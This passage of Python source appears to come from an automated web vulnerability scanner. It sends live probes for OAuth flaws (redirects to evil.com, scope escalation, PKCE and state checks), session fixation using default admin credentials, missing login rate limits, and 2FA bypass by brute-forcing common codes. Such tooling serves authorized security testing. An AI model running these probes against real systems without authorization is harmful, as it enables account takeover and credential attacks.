                    asset=auth_endpoint, cvss='9.1', owasp='A07', mitre='T1550.001',
                    details=f'Authorization endpoint: {auth_endpoint}\n'
                            f'Tested redirect_uri: {evil_url}\n'
                            f'Bypass technique: {description}\n'
                            f'Location header: {location}\n'
                            f'Impact: Authorization code theft via redirect',
                    confidence='high')
                findings_count += 1
                log('ok', f'[OAUTH-ATTACK] Open redirect confirmed: {description}')
                break  # One confirmed is enough
        except Exception:
            pass

    # ─── Phase 4: Missing state parameter ──────────────────────────────────
    try:
        r = req_lib.get(auth_endpoint, params={
            'response_type': 'code',
            'client_id': client_id,
            'redirect_uri': real_redirect_uris[0],
            'scope': 'openid',
        }, timeout=8, verify=False, allow_redirects=False)
        location = r.headers.get('Location', '')
        if r.status_code in (302, 303, 307) and 'state=' not in location:
            add_finding(
                'medium',
                f'OAuth missing state parameter — CSRF on auth flow',
                sub='Authorization request accepted without state parameter',
                asset=auth_endpoint, cvss='6.5', owasp='A07', mitre='T1550.001',
                details=f'Authorization endpoint: {auth_endpoint}\n'
                        f'Request accepted without state parameter\n'
                        f'Location: {location[:200]}\n'
                        f'Impact: CSRF attack on OAuth authorization flow',
                confidence='high')
            findings_count += 1
            log('ok', f'[OAUTH-ATTACK] Missing state parameter')
    except Exception:
        pass

    # ─── Phase 5: PKCE downgrade ──────────────────────────────────────────
    try:
        r = req_lib.get(auth_endpoint, params={
            'response_type': 'code',
            'client_id': client_id,
            'redirect_uri': real_redirect_uris[0],
            'scope': 'openid',
        }, timeout=8, verify=False, allow_redirects=False)
        if r.status_code in (302, 303, 307):
            location = r.headers.get('Location', '')
            if 'code_challenge' not in location:
                add_finding(
                    'high',
                    f'OAuth PKCE not enforced — authorization code interception possible',
                    sub='Server accepts auth code request without code_challenge',
                    asset=auth_endpoint, cvss='7.4', owasp='A07', mitre='T1550.001',
                    details=f'Authorization endpoint: {auth_endpoint}\n'
                            f'Request without code_challenge accepted\n'
                            f'Impact: Auth code interception via malware or MITM',
                    confidence='high')
                findings_count += 1
                log('ok', f'[OAUTH-ATTACK] PKCE downgrade')
    except Exception:
        pass

    # ─── Phase 6: Token leakage — implicit flow ───────────────────────────
    try:
        r = req_lib.get(auth_endpoint, params={
            'response_type': 'token',
            'client_id': client_id,
            'redirect_uri': real_redirect_uris[0],
            'scope': 'openid',
        }, timeout=8, verify=False, allow_redirects=False)
        location = r.headers.get('Location', '')
        if r.status_code in (302, 303) and 'access_token=' in location:
            add_finding(
                'high',
                f'OAuth implicit flow token in URL fragment',
                sub='Access token returned in URL — Referer leak possible',
                asset=auth_endpoint, cvss='7.4', owasp='A07', mitre='T1550.001',
                details=f'Authorization endpoint: {auth_endpoint}\n'
                        f'Token in Location: {location[:200]}\n'
                        f'Impact: Token leaked via Referer header to third parties',
                confidence='high')
            findings_count += 1
            log('ok', f'[OAUTH-ATTACK] Token in URL fragment')
    except Exception:
        pass

    # ─── Phase 7: Scope escalation ────────────────────────────────────────
    admin_scopes = ['admin', 'write', 'superuser', 'openid admin', 'profile admin email',
                    'user:admin', 'repo', 'api:write', 'admin:all', 'full_access']
    for scope in admin_scopes:
        if not scan_state.get('scanning'):
            break
        try:
            r = req_lib.get(auth_endpoint, params={
                'response_type': 'code',
                'client_id': client_id,
                'redirect_uri': real_redirect_uris[0],
                'scope': scope,
            }, timeout=8, verify=False, allow_redirects=False)
            if r.status_code in (200, 302, 303, 307):
                location = r.headers.get('Location', '')
                if scope.split()[0] in location.lower() or r.status_code == 200:
                    add_finding(
                        'critical',
                        f'OAuth scope escalation: "{scope}" accepted',
                        sub=f'Server granted elevated scope "{scope}" to public client',
                        asset=auth_endpoint, cvss='9.1', owasp='A01', mitre='T1550.001',
                        details=f'Authorization endpoint: {auth_endpoint}\n'
                                f'Requested scope: {scope}\n'
                                f'Response: {r.status_code}\n'
                                f'Impact: Privilege escalation via scope injection',
                        confidence='high')
                    findings_count += 1
                    log('ok', f'[OAUTH-ATTACK] Scope escalation: {scope}')
                    break
        except Exception:
            pass

    # ─── Phase 8: Token endpoint testing ───────────────────────────────────
    if token_endpoint:
        # Test: client credentials with no secret
        try:
            r = req_lib.post(token_endpoint, data={
                'grant_type': 'client_credentials',
                'client_id': client_id,
                'scope': 'openid',
            }, timeout=8, verify=False)
            if r.status_code == 200 and 'access_token' in r.text:
                add_finding(
                    'critical',
                    f'OAuth token endpoint accepts client_credentials without secret',
                    sub='Token issued without client authentication',
                    asset=token_endpoint, cvss='9.1', owasp='A07', mitre='T1550.001',
                    details=f'Token endpoint: {token_endpoint}\n'
                            f'Grant type: client_credentials\n'
                            f'No client_secret provided\n'
                            f'Impact: Full OAuth token theft',
                    confidence='high')
                findings_count += 1
                log('ok', f'[OAUTH-ATTACK] Token endpoint unauthenticated')
        except Exception:
            pass

        # Test: PKCE bypass on token exchange (send code without code_verifier)
        try:
            r = req_lib.post(token_endpoint, data={
                'grant_type': 'authorization_code',
                'code': 'test_code',
                'redirect_uri': real_redirect_uris[0],
                'client_id': client_id,
            }, timeout=8, verify=False)
            resp_text = r.text.lower()
            # If error is about invalid code (not missing code_verifier), PKCE not enforced
            if 'invalid_grant' in resp_text and 'code_verifier' not in resp_text and 'code_challenge' not in resp_text:
                add_finding(
                    'high',
                    f'OAuth token endpoint does not enforce PKCE code_verifier',
                    sub='Token exchange accepted without code_verifier',
                    asset=token_endpoint, cvss='7.4', owasp='A07', mitre='T1550.001',
                    details=f'Token endpoint: {token_endpoint}\n'
                            f'Grant: authorization_code without code_verifier\n'
                            f'Error: {r.text[:200]}\n'
                            f'Impact: Authorization code interception',
                    confidence='medium')
                findings_count += 1
        except Exception:
            pass

    # ─── Phase 9: CORS misconfiguration ───────────────────────────────────
    try:
        r = req_lib.options(auth_endpoint, headers={
            'Origin': 'https://evil.com',
            'Access-Control-Request-Method': 'GET',
        }, timeout=5, verify=False)
        acao = r.headers.get('Access-Control-Allow-Origin', '')
        if 'evil.com' in acao or acao == '*':
            add_finding(
                'high',
                f'OAuth endpoint CORS misconfiguration',
                sub=f'Access-Control-Allow-Origin: {acao}',
                asset=auth_endpoint, cvss='7.4', owasp='A05', mitre='T1190',
                details=f'Endpoint: {auth_endpoint}\n'
                        f'ACAO header: {acao}\n'
                        f'Impact: Cross-origin token theft',
                confidence='high')
            findings_count += 1
    except Exception:
        pass

    # ─── Phase 10: Logout / token revocation ──────────────────────────────
    logout_paths = ['/logout', '/signout', '/oauth/logout', '/auth/logout', '/o/logout']
    for lpath in logout_paths:
        try:
            r = req_lib.get(f'{base_url}{lpath}', timeout=5, verify=False, allow_redirects=False)
            if r.status_code in (200, 302, 303):
                # Check if logout is GET (CSRF logout)
                if r.status_code == 200 or 'post' not in r.text.lower():
                    add_finding(
                        'low',
                        f'OAuth logout via GET (CSRF logout possible)',
                        sub=f'Logout endpoint {lpath} accepts GET requests',
                        asset=f'{base_url}{lpath}', cvss='3.1', owasp='A01', mitre='T1550',
                        details=f'Endpoint: {lpath}\nMethod: GET accepted\n'
                                f'Impact: CSRF logout attack',
                        confidence='medium')
                    findings_count += 1
                    break
        except Exception:
            pass

    log('ok', f'[OAUTH-ATTACK] Scan complete — {findings_count} findings')
    set_progress('oauth', 100)




def run_session_fixation_module(target):
    """Production-grade session fixation detection.
    
    Real logic:
    1. Get session cookie before login
    2. Attempt login with credentials
    3. Check if session cookie changes after login
    4. Test if pre-set session ID is accepted
    5. Check cookie security flags (Secure, HttpOnly, SameSite)
    """
    log('info', '[SESSION] Starting production-grade session fixation testing')
    base_url = f'https://{target}'
    session_findings = []
    s = ScanSession()

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        forms = disc.get('forms', [])

    # ── Step 1: Find login forms ──
    login_forms = []
    for form in forms:
        inputs = form.get('inputs', [])
        has_password = any(i.get('type', '') == 'password' or
                          'pass' in i.get('name', '').lower() for i in inputs)
        if has_password:
            action = form.get('action', '')
            if action:
                form_url = action if action.startswith('http') else f'{base_url}{action}'
                login_forms.append({'url': form_url, 'inputs': inputs})

    # ── Step 2: Session fixation test ──
    for login_form in login_forms[:3]:
        if not scan_state.get('scanning'):
            break

        try:
            # Fresh session: get initial cookie
            fresh_session = req_lib.Session()
            fresh_session.verify = False
            r1 = fresh_session.get(login_form['url'], timeout=8)

            # Get session cookie
            session_cookies = {}
            for cookie_name, cookie_val in fresh_session.cookies.items():
                if any(kw in cookie_name.lower() for kw in ['session', 'sid', 'token', 'jsession', 'phpsess', 'aspsess']):
                    session_cookies[cookie_name] = cookie_val

            if not session_cookies:
                continue

            # Attempt login
            for cookie_name, original_val in session_cookies.items():
                data = {}
                for inp in login_form['inputs']:
                    name = inp.get('name', '').lower()
                    original_name = inp.get('name', '')
                    if 'user' in name or 'email' in name:
                        data[original_name] = 'admin'
                    elif 'pass' in name:
                        data[original_name] = 'password123'
                    else:
                        data[original_name] = inp.get('value', 'test')

                r2 = fresh_session.post(login_form['url'], data=data,
                                       timeout=8, allow_redirects=True)

                # Check if session cookie changed
                new_val = fresh_session.cookies.get(cookie_name, '')
                if new_val and new_val == original_val:
                    # Session NOT regenerated = vulnerability
                    session_findings.append({'cookie': cookie_name, 'type': 'fixation'})
                    add_finding(
                        'high',
                        f'Session fixation: cookie {cookie_name} not regenerated',
                        sub=f'Session ID remains the same after login attempt',
                        asset=login_form['url'], cvss='7.4', owasp='A07', mitre='T1189',
                        details=f'Cookie: {cookie_name}\n'
                                f'Before login: {original_val[:30]}...\n'
                                f'After login: {new_val[:30]}...\n'
                                f'Confirmed: Session ID not regenerated after authentication\n'
                                f'Exploit: Pre-set session ID before victim login')
                    log('ok', f'[SESSION] Fixation confirmed: {cookie_name}')
                    break

                # Check if session is regenerated (good behavior)
                if new_val and new_val != original_val:
                    log('ok', f'[SESSION] Session regenerated correctly: {cookie_name}')

        except Exception:
            pass

    # ── Step 3: Cookie security flags analysis ──
    try:
        r = s.get(base_url)
        if r:
            for cookie_name, cookie_val in r.cookies.items():
                cookie_obj = None
                for c in s._session.cookies:
                    if c.name == cookie_name:
                        cookie_obj = c
                        break

                if cookie_obj:
                    issues = []
                    if not cookie_obj.secure:
                        issues.append('Secure flag not set')
                    if not cookie_obj.has_nonstandard_attr('HttpOnly'):
                        issues.append('HttpOnly flag not set')
                    if not cookie_obj.has_nonstandard_attr('SameSite'):
                        issues.append('SameSite attribute not set')

                    if issues:
                        add_finding(
                            'medium',
                            f'Insecure session cookie: {cookie_name}',
                            sub=f'Cookie missing security flags',
                            asset=base_url, cvss='5.0', owasp='A05', mitre='T1185',
                            details=f'Cookie: {cookie_name}\nIssues: {", ".join(issues)}\n'
                                    f'Confirmed: Cookie security flags missing')
    except Exception:
        pass

    log('ok', f'[SESSION] Scan complete - {len(session_findings)} findings')
    set_progress('session', 100)


# ─── JWT ATTACKS ──────────────────────────────────────────────────────────────


def run_credential_stuffing_module(target):
    """Simulate credential stuffing patterns."""
    log('info', '[STUFFING] Testing credential stuffing readiness')
    base_url = f'https://{target}'
    stuffing_findings = []

    with LOCK:
        disc = scan_state.get('discovery_data', {})
        forms = disc.get('forms', [])

    login_forms = []
    for form in forms:
        inputs = form.get('inputs', [])
        has_password = any(i.get('type', '') == 'password' or 'pass' in i.get('name', '').lower() for i in inputs)
        if has_password:
            action = form.get('action', '')
            if action:
                form_url = action if action.startswith('http') else f'{base_url}{action}'
                login_forms.append({'url': form_url, 'inputs': inputs})

    for login_form in login_forms[:2]:
        if not scan_state.get('scanning'):
            break
        try:
            # Test rate limiting: send 10 rapid requests
            blocked = False
            for i in range(10):
                data = {}
                for inp in login_form['inputs']:
                    name = inp.get('name', '')
                    if name:
                        if 'user' in name.lower() or 'email' in name.lower():
                            data[name] = f'test{i}@test.com'
                        elif 'pass' in name.lower():
                            data[name] = f'password{i}'
                        else:
                            data[name] = inp.get('value', 'test')

                r = req_lib.post(login_form['url'], data=data, timeout=5, verify=False)
                if r.status_code in (429, 403, 503):
                    blocked = True
                    break
                if 'rate limit' in r.text.lower() or 'too many' in r.text.lower():
                    blocked = True
                    break

            if not blocked:
                add_finding(
                    'high',
                    f'No rate limiting on login at {urlparse(login_form["url"]).path}',
                    sub='10 rapid login attempts not blocked',
                    asset=login_form['url'], cvss='7.5', owasp='A07', mitre='T1110',
                    details=f'Login endpoint: {login_form["url"]}\n'
                            f'Attempts: 10 rapid requests\n'
                            f'Blocked: No\n'
                            f'Confirmed: No rate limiting protection')
                stuffing_findings.append({'endpoint': login_form['url']})
                log('ok', f'[STUFFING] No rate limiting at {login_form["url"]}')
        except Exception:
            pass

    log('ok', f'[STUFFING] Scan complete - {len(stuffing_findings)} findings')
    set_progress('stuffing', 100)


# ─── TWO-FACTOR AUTH BYPASS ───────────────────────────────────────────────────


def run_2fa_bypass_module(target):
    """Test for 2FA bypass vulnerabilities."""
    log('info', '[2FA] Testing 2FA bypass')
    base_url = f'https://{target}'
    twofa_findings = []

    # Common 2FA bypass techniques
    bypass_endpoints = ['/api/verify', '/api/2fa/verify', '/verify-code',
                        '/two-factor', '/2fa/verify', '/otp/verify']

    for endpoint in bypass_endpoints:
        if not scan_state.get('scanning'):
            break
        try:
            # Test 1: Skip 2FA by accessing protected resource directly.
            # Baseline REQUIRED: endpoint must return 401/403 without auth first.
            # If the page is already public (200), it is NOT a 2FA bypass.
            protected_endpoints = ['/dashboard', '/account', '/profile', '/admin', '/settings']
            for protected_ep in protected_endpoints:
                try:
                    r_baseline = req_lib.get(f'{base_url}{protected_ep}', timeout=8, verify=False,
                                              allow_redirects=False)
                    if r_baseline.status_code not in (401, 403):
                        log('info', f'[2FA] {protected_ep} baseline={r_baseline.status_code} — not auth-protected, skipping bypass test')
                        continue
                    # Endpoint is auth-protected — now test direct access without 2FA step
                    r = req_lib.get(f'{base_url}{protected_ep}', timeout=8, verify=False,
                                    headers={'X-Skip-2FA': '1', 'X-Auth-Token': 'bypass'})
                    user_data_indicators = ['email', '@', 'username', 'profile', 'account', 'settings']
                    has_user_data = any(ind in r.text.lower() for ind in user_data_indicators)
                    if r.status_code == 200 and has_user_data:
                        add_finding(
                            'critical',
                            f'2FA bypass: Direct access to {protected_ep}',
                            sub=f'Auth-protected page accessible without 2FA verification',
                            asset=f'{base_url}{protected_ep}', cvss='9.1', owasp='A07', mitre='T1078',
                            details=f'Baseline: {r_baseline.status_code} (auth required)\n'
                                    f'Bypass: {r.status_code} (content returned)\n'
                                    f'Confirmed: Bypassed — auth-protected endpoint accessible without 2FA')
                        twofa_findings.append({'type': 'direct_access', 'endpoint': protected_ep})
                        log('ok', f'[2FA] Direct access bypass confirmed at {protected_ep}')
                        break
                except Exception:
                    pass

            # Test 2: Brute force 2FA code — only flag if endpoint exists AND code is accepted
            # with no negative indicators in response (invalid, error, expired, etc.)
            _negative_kw = ('invalid', 'error', 'expired', 'incorrect', 'wrong', 'false', 'fail',
                            'denied', 'blocked', 'rate limit', 'too many')
            for code in ['0000', '1234', '1111', '000000', '123456']:
                try:
                    r2 = req_lib.post(f'{base_url}{endpoint}',
                                    json={'code': code}, timeout=5, verify=False)
                    if r2.status_code == 404:
                        break  # endpoint doesn't exist at all
                    body2 = r2.text.lower()
                    has_positive = r2.status_code == 200 and ('success' in body2 or 'valid' in body2 or 'verified' in body2 or 'token' in body2)
                    has_negative = any(kw in body2 for kw in _negative_kw)
                    if has_positive and not has_negative:
                        add_finding(
                            'critical',
                            f'2FA bypass: Common code accepted ({code})',
                            sub=f'2FA endpoint accepts trivially-guessable code {code}',
                            asset=f'{base_url}{endpoint}', cvss='9.8', owasp='A07', mitre='T1110',
                            details=f'Endpoint: {endpoint}\nCode: {code}\n'
                                    f'Response status: {r2.status_code}\n'
                                    f'Confirmed: Bypassed — common code accepted with positive response')
                        twofa_findings.append({'type': 'weak_code', 'code': code})
                        log('ok', f'[2FA] Weak code accepted: {code} at {endpoint}')
                        break
                except Exception:
                    pass
        except Exception:
            pass

    log('ok', f'[2FA] Scan complete - {len(twofa_findings)} findings')
    set_progress('2fa', 100)


# ─── HOST HEADER INJECTION ────────────────────────────────────────────────────
